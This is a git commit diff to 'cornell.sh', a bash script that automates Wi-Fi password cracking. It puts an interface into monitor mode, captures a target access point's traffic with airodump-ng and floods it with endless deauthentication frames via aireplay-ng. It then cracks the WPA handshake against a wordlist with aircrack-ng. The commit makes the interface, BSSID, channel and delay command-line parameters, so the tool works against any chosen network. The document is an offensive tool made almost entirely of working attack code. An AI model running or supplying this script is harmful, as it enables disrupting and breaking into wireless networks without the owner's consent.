ca02a514e93e3634c3d0203a04c156fb77b2e65f
Beyond Studios <mauricio@beyondstudios.pe>
2019-03-30 12:39:49 -0500

    parameters

--- cornell.sh
+++ cornell.sh
@@ -10,16 +10,17 @@ log_header(){ echo -e "\n\e[92m\e[1mCORNELL V1.0 -  \e[0mhttp://mauricio.pe\n---
 
 
 
-INTERFACE_MONITOR="wlx00c0ca3ebe53" #$3
-BSSID="D4:7B:B0:84:79:C0"
-CHANNEL=11
-W_FOLDER=/home/dstrok3/disk/Evil/pcap/wifidump/
+INTERFACE_MONITOR=$1
+BSSID=$2
+CHANNEL=$3
+
+W_FOLDER=/tmp
 W_FILE='wifi-dump'
 WORDLIST='/home/dstrok3/disk/Evil/wordlists/big.txt'
 
-log_ok 'Creating folders...'
-rm -rf ${W_FOLDER}/* &&
-mkdir ${W_FOLDER}
+
+echo 'Cleaning tmps...'
+rm -rf ${W_FOLDER}/${W_FILE}*
 
 function exit_process(){ echo -e "Crash..."; fn_exit; }
 function ctrl_c() {  echo -e "Exit by user"; fn_exit; }
@@ -36,7 +37,7 @@ function fn_exit(){
 
 function killing_all(){
 	applications=( aircrack-ng airodump-ng aireplay-ng airbase-ng )
-	
+
 	log_info "\nKilling applications..."
 	for i in ${applications[@]}; do
 		if ps -A | grep -q ${i}; then
@@ -78,21 +79,20 @@ killing_all
 echo -e "\n"
 
 
-
 log_ok "Setting Mode Monitor..."
 ifconfig ${INTERFACE_MONITOR} down && iwconfig ${INTERFACE_MONITOR} mode monitor && ifconfig ${INTERFACE_MONITOR} up &&
 
 
 
 log_ok "Dumping network..."
-xterm -bg blue -geometry 93x28+0+0 -T "Dumping..." -e bash -c "airodump-ng -c ${CHANNEL} --bssid ${BSSID} -w ${W_FOLDER}/${W_FILE} wlx00c0ca3ebe53"  &
+xterm -bg blue -geometry 93x28+0+0 -T "Dumping..." -e bash -c "airodump-ng -c ${CHANNEL} --bssid ${BSSID} -w ${W_FOLDER}/${W_FILE} $INTERFACE_MONITOR"  &
 
 sleep 4
 
 xterm -geometry 93x28+0+450 -e bash -c "aireplay-ng -0 0 -a ${BSSID}  ${INTERFACE_MONITOR}" &
 
 
-sleep 20
+sleep $4
 log_ok "Cracking password..."
 xterm -hold -geometry 93x28+600+0 -T "Cracking password" -e bash -c "aircrack-ng -a2 -b ${BSSID} -w '${WORDLIST}' '${W_FOLDER}/${W_FILE}-01.cap'" &
 
